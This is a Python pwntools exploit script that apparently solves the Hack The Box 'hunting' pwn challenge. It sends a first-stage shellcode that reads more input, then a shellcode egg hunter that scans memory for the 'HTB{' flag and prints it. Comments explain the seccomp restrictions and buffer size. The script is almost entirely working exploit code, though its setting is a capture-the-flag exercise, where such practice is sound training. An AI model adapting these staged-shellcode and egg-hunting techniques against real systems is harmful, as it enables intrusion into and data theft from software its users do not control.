#!/usr/bin/env python3

from pwn import *

e = ELF("./hunting_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      set breakpoint pending on
                      b *(__libc_start_main)
                      commands 1
                        set $a = $eax - 0x100 + 0x63
                        b *$a
                        set $a = $eax - 0x100 + 0xc7
                        b *$a
                        c
                      end
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # Staged payloads + egg hunter
    # (Actually the staged payloads is unnecessary since the egg hunter is small enough to fit the 60-byte buffer.)

    # seccomp-tools dump ./hunting => restricted syscalls, cannot bring up shell

    # Stage 1: read more shellcode.
    # The eax happens to contain the _buf address. The 0x3c is the read() length in the binary. We put out shellcode after it.
    read_asm = f'''
                lea eax, [eax + 0x3c]
                {shellcraft.read(0, 'eax', 200)}
            '''
    info(f'read asm is {read_asm}')
    combined_asm = read_asm
    combined_opcode = asm(combined_asm)
    info(f'combined opcode size is {len(combined_opcode)}')
    r.send(combined_opcode + (0x3c - len(combined_opcode)) * b'\x90')

    # Stage 2: flag-reading shellcode
    # Note that the _addr (0x60000000<= _addr <= 0xf7000000) (RTFSC) and the _buf (> 0xf7000000) (from debugging) are in different space.
    # So we don't have to worry about the egg hunter finds itself.
    EGG = b'HTB{' # }
    egg_hunter_asm = shellcraft.egghunter(EGG, start_address=0x60000000)
    info(f'egg hunting code is {egg_hunter_asm}')
    info(f'egg hunting code has length {len(asm(egg_hunter_asm))}')     # Actually this egg hunter can fit in the 60-byte buffer. We don't need staged payloads.
    # The 'ebx' the found egg address from the egg hunter above.
    write_asm = shellcraft.write(1, 'ebx', 100)
    info(f'write asm is {write_asm}')
    combined_opcode = asm(egg_hunter_asm + write_asm)
    r.send(combined_opcode)

    r.interactive()

if __name__ == "__main__":
    main()
